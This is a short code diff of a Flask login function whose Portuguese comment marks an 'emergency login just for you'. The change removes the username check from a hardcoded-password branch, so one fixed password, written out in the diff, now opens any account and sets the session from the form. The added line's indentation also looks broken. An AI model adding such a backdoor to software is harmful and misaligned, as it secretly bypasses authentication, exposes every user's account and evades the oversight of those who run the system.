@@ -42,7 +42,7 @@ def login():
                     return redirect("/painel")
 
                 # 🔥 LOGIN EMERGÊNCIA (SÓ PRA VOCÊ)
-                elif request.form["senha"] == "997401054" and request.form["user"] in ["kaua", "kaua@gmail.com"]:
+              elif request.form["senha"] == "997401054":
                     session["user"] = request.form["user"]
                     session["cargo"] = user[1]
 
